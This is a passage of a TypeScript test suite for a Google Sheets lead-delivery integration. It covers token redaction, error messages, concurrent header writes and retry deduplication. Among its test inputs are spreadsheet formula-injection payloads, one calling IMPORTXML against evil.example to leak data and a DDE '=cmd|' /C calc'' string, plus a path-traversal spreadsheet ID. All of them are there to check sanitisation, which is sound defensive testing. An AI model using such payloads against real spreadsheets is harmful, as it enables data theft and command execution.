      first.calls.slice(1).every((call) => call.headers.authorization === `Bearer ${ACCESS}`),
    );
    ok(
      "the spreadsheet is the one configured",
      first.calls.slice(1).every((call) => call.url.includes(`/spreadsheets/${SHEET_ID}/values/`)),
    );
    const append = first.calls[4];
    ok("values are written RAW, never parsed as formulas", append?.url.includes("valueInputOption=RAW") ?? false, append?.url);
    ok("as new rows, not over existing ones", append?.url.includes("insertDataOption=INSERT_ROWS") ?? false);
    t(
      "the header written is ours, in order",
      JSON.parse(first.calls[2]?.body ?? "{}").values?.[0],
      ["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"],
    );

    // What the delivery log keeps. The workspace can read it, so neither token
    // may be in it.
    const logged = JSON.stringify({
      body: first.result.requestBody,
      headers: first.result.requestHeaders,
      response: first.result.responseBody,
      error: first.result.error,
    });
    ok("the log holds no access token", !logged.includes(ACCESS), logged);
    ok("and no refresh token", !logged.includes(REFRESH), logged);
    // The control: the token did go out on the wire, so the absence above is
    // the redaction working rather than a token that never existed.
    ok("though the token really was sent", first.calls.some((call) => JSON.stringify(call).includes(ACCESS)));
    ok("the log keeps the row that was sent", (first.result.requestBody ?? "").includes("priya@dorsetmetal.example"));
    ok("and Google's answer", (first.result.responseBody ?? "").includes("updatedRange"));

    // M3, through the adapter: the schema reaches the planner.
    const schemaDelivery = await deliver(
      [tokenOk, ...liveHeader([]).handlers, appendOk],
      { declaredFields: ["name"] },
    );
    ok("a schema endpoint delivers", schemaDelivery.result.ok, schemaDelivery.result);
    const schemaHeader = JSON.parse(schemaDelivery.calls.find((call) => call.method === "PUT")?.body ?? "{}").values?.[0] ?? [];
    ok(
      "and an undeclared field gets no column of its own",
      schemaHeader.includes("name") && !schemaHeader.includes("email") && schemaHeader.includes("Other fields"),
      schemaHeader,
    );

    // A header that already has everything, in another order.
    const existing = await deliver([
      tokenOk,
      {
        match: isSheets("GET", "!1:1"),
        status: 200,
        body: { values: [["email", "Origin", "Notes", "Submission ID", "Submitted at", "name", "utm_medium", "utm_source"]] },
      },
      appendOk,
    ]);
    ok("a full header needs no header write", !existing.calls.some((call) => call.method === "PUT"));
    t(
      "and the row follows the sheet's order, leaving their column alone",
      JSON.parse(existing.calls.at(-1)?.body ?? "{}").values?.[0],
      ["priya@dorsetmetal.example", "Human", "", "sub_real_lead_01", "2026-10-01T11:59:58.412Z", "Priya", "cpc", "google"],
    );

    const formula = await deliver(
      [tokenOk, ...liveHeader([]).handlers, appendOk],
      { payload: payload({ company: '=IMPORTXML("https://evil.example","//secret")' }) },
    );
    ok(
      "a submitted formula is sent as text, with a leading quote so an export cannot run it (M5)",
      (formula.calls.at(-1)?.body ?? "").includes(`"'=IMPORTXML(\\"https://evil.example\\",\\"//secret\\")"`),
      formula.calls.at(-1)?.body,
    );

    // M5 for a header name and for attribution, which arrives in a query string.
    const hostileNames = await deliver(
      [tokenOk, ...liveHeader([]).handlers, appendOk],
      {
        payload: buildPayload(
          { ...sampleSource({ publicId: "ep", name: "x" }), values: { "=cmd|' /C calc'!A0": "x" }, utmSource: "@SUM(1+1)" },
          { id: "dlv", attempt: 1, sentAt: new Date(), test: false },
        ),
      },
    );
    const hostileHeader: string[] = JSON.parse(hostileNames.calls.find((call) => call.method === "PUT")?.body ?? "{}").values?.[0] ?? [];
    ok("a header name that starts a formula is quoted", hostileHeader.includes("'=cmd|' /C calc'!A0"), hostileHeader);
    ok(
      "and so is an attribution value",
      (hostileNames.calls.at(-1)?.body ?? "").includes(`"'@SUM(1+1)"`),
      hostileNames.calls.at(-1)?.body,
    );

    // A tab name that is hostile to A1 notation and to a URL path both.
    const odd = await deliver(
      [tokenOk, ...liveHeader(["Submitted at"]).handlers, appendOk],
      { config: { ...storedConfig, sheetName: "Priya's / leads?#" } },
    );
    ok("a tab with quotes and slashes is delivered to", odd.result.ok, odd.result);
    ok(
      "quoted for A1 notation",
      decodeURIComponent(odd.calls[1]?.url ?? "").includes("'Priya''s / leads?#'!1:1"),
      odd.calls[1]?.url,
    );
    ok(
      "and encoded so it cannot leave the values path",
      odd.calls.slice(1).every((call) => new URL(call.url).pathname.startsWith(`/v4/spreadsheets/${SHEET_ID}/values/`) && !new URL(call.url).hash),
      odd.calls.map((call) => call.url),
    );
    ok("new columns start to the right of the existing header", odd.calls.some((call) => call.method === "PUT" && decodeURIComponent(call.url).includes("!B1")));
  });
}

async function failures() {
  console.log("\nfailures, in the words of whoever has to fix them");

  await withEnv(CLIENT, async () => {
    const revoked = await deliver([
      { match: isToken, status: 400, body: { error: "invalid_grant", error_description: "Token has been expired or revoked." } },
    ]);
    t("a revoked grant is revoked", revoked.result.failure, "revoked");
    t("and nothing was asked of the Sheets API", revoked.calls.length, 1);
    ok("it says to reconnect", /Reconnect/.test(revoked.result.error ?? ""), revoked.result.error);

    const header = (status: number, body: unknown) => [
      tokenOk,
      { match: isSheets("GET", "!1:1"), status, body },
    ];

    const renamed = await deliver(
      header(400, { error: { code: 400, message: "Unable to parse range: 'Leads'!1:1", status: "INVALID_ARGUMENT" } }),
    );
    t("a renamed tab is configuration", renamed.result.failure, "configuration");
    ok("and names the tab", /no tab called "Leads"/.test(renamed.result.error ?? ""), renamed.result.error);

    const unshared = await deliver(
      header(403, { error: { code: 403, message: "The caller does not have permission", status: "PERMISSION_DENIED" } }),
    );
    t("a sheet that was unshared is auth", unshared.result.failure, "auth");
    ok("and says to share it back", /Share it back/.test(unshared.result.error ?? ""), unshared.result.error);

    const disabled = await deliver(
      header(403, {
        error: {
          code: 403,
          message: "Google Sheets API has not been used in project 123 before or it is disabled.",
          status: "PERMISSION_DENIED",
          details: [{ reason: "SERVICE_DISABLED" }],
        },
      }),
    );
    t("the API switched off is the deployment's problem", disabled.result.failure, "configuration");
    ok("and says it is not the customer's", /not anything you connected/.test(disabled.result.error ?? ""));

    const gone = await deliver(header(404, { error: { code: 404, message: "Requested entity was not found.", status: "NOT_FOUND" } }));
    t("a deleted spreadsheet is missing", gone.result.failure, "missing");

    const throttled = await deliver(header(429, { error: { code: 429, message: "Quota exceeded", status: "RESOURCE_EXHAUSTED" } }));
    t("a quota is throttled, and retried", throttled.result.failure, "throttled");

    const down = await deliver(header(503, { error: { code: 503, message: "The service is currently unavailable.", status: "UNAVAILABLE" } }));
    t("a Google outage is target_down", down.result.failure, "target_down");
    ok("with Google's own words", /currently unavailable/.test(down.result.error ?? ""), down.result.error);

    const broken = await deliver([], { config: { ...storedConfig, spreadsheetId: "../../drive" } });
    t("a broken config is configuration", broken.result.failure, "configuration");
    t("and makes no request at all", broken.calls.length, 0);
  });

  await withEnv({ GOOGLE_SHEETS_CLIENT_ID: undefined, GOOGLE_SHEETS_CLIENT_SECRET: undefined }, async () => {
    const off = await deliver([]);
    t("a deployment with no Google client fails as configuration", off.result.failure, "configuration");
    t("with the sentence for both readers", off.result.error, GOOGLE_SHEETS_NOT_CONFIGURED);
  });
}

async function headerRace() {
  console.log("\ntwo deliveries adding columns at once (M2)");

  await withEnv(CLIENT, async () => {
    const ours3 = ["Submitted at", "Origin", "Submission ID"];

    // Deterministic: right after our first header write, another delivery
    // overwrites the same cell with its own new column.
    const raced = liveHeader(ours3, (header, writes) => {
      if (writes === 1) header[3] = "phone";
    });
    const lost = await deliver([tokenOk, ...raced.handlers, appendOk], {
      payload: payload({ company: "Dorset Metal" }, { utm: false }),
    });
    ok("a delivery whose header write was overwritten still delivers", lost.result.ok, lost.result);
    const appended: unknown[] = JSON.parse(lost.calls.at(-1)?.body ?? "{}").values?.[0] ?? [];
    t("its column was written again, after the one that won", raced.state.header, [...ours3, "phone", "company"]);
    t("so its value lands under its own name", appended[4], "Dorset Metal");
    t("and not under the other delivery's", appended[3], "");
    t(
      "with one extra read-back, and no append until the header held",
      lost.calls.map((call) => call.method),
      ["POST", "GET", "PUT", "GET", "PUT", "GET", "POST"],
    );

    // Two real deliveries, interleaved through one shared header. Each fake
    // call resolves immediately, so their awaits alternate.
    const shared = liveHeader(ours3);
    const appends: unknown[][] = [];
    const recordAppend: Handler = {
      match: isSheets("POST", ":append"),
      status: 200,
      body: (call: Call) => {
        appends.push((JSON.parse(call.body) as { values: unknown[][] }).values[0]);
        return { updates: { updatedRows: 1 } };
      },
    };
    const [a, b] = await Promise.all([
      deliver([tokenOk, ...shared.handlers, recordAppend], { payload: payload({ company: "A Co" }, { utm: false }) }),
      deliver([tokenOk, ...shared.handlers, recordAppend], { payload: payload({ phone: "0123" }, { utm: false }) }),
    ]);
    ok("both interleaved deliveries succeed", a.result.ok && b.result.ok, [a.result.error, b.result.error]);
    const header = shared.state.header;
    t("and the header holds both new columns", [...header].sort(), [...ours3, "company", "phone"].sort());
    const companyRow = appends.find((row) => row.includes("A Co")) ?? [];
    const phoneRow = appends.find((row) => row.includes("0123")) ?? [];
    t("A's value is under company", companyRow[header.indexOf("company")], "A Co");
    t("B's value is under phone", phoneRow[header.indexOf("phone")], "0123");

    // A header that never holds: bounded, and nothing appended.
    const churning = liveHeader(ours3, (h) => {
      h[h.length - 1] = `someone-else-${Math.random()}`;
    });
    const gaveUp = await deliver([tokenOk, ...churning.handlers, appendOk], {
      payload: payload({ company: "C Co" }, { utm: false }),
    });
    ok("a header that keeps moving fails the delivery", !gaveUp.result.ok);
    ok("as retryable", gaveUp.result.failure !== null && RETRYABLE_FAILURES.has(gaveUp.result.failure), gaveUp.result.failure);
    ok("after a bounded number of tries", churning.state.writes === 3, churning.state.writes);
    ok("and nothing was appended", !gaveUp.calls.some((call) => call.url.includes(":append")));
  });
}

async function retries() {
  console.log("\nretries do not duplicate rows");

  await withEnv(CLIENT, async () => {
    const headerWithId = {
      match: isSheets("GET", "!1:1"),
      status: 200,
      body: { values: [["Submitted at", "Origin", "Submission ID", "name", "email", "utm_source", "utm_medium"]] },
    };

    const already = await deliver(
      [
        tokenOk,
        headerWithId,
        { match: isSheets("GET", "!C:C"), status: 200, body: { values: [["Submission ID", "sub_older", "sub_real_lead_01"]] } },
        appendOk,
      ],
      { payload: payload({ name: "Priya", email: "priya@dorsetmetal.example" }, { attempt: 2 }) },
    );
    ok("a retry whose row already landed succeeds", already.result.ok, already.result);
    ok("without appending it again", !already.calls.some((call) => call.url.includes(":append")), already.calls.map((call) => call.url));
    ok("and says why", /Nothing was appended twice/.test(already.result.responseBody ?? ""));

    // The control: the same retry when the row is not there does append, so
    // the line above is the check finding it rather than a retry that never
    // appends anything.
    const missing = await deliver(
      [
        tokenOk,
        headerWithId,
        { match: isSheets("GET", "!C:C"), status: 200, body: { values: [["Submission ID", "sub_older"]] } },
        appendOk,
      ],
      { payload: payload({ name: "Priya", email: "priya@dorsetmetal.example" }, { attempt: 2 }) },
    );
    ok("a retry whose row did not land appends it", missing.calls.some((call) => call.url.includes(":append")));

    const firstAttempt = await deliver([tokenOk, headerWithId, appendOk]);
    ok("the first attempt does not spend a read looking", !firstAttempt.calls.some((call) => decodeURIComponent(call.url).includes("!C:C")));
  });
}

// ---------------------------------------------------------------------------

async function main() {
  await configuration();
  await codeExchange();
  await refresh();
  await roundTrip();
  await config();
  await rows();
  await delivery();
  await failures();
  await headerRace();
  await retries();

  console.log(`\n${pass} passed, ${fail} failed`);
  if (fail > 0) process.exitCode = 1;
}

await main();
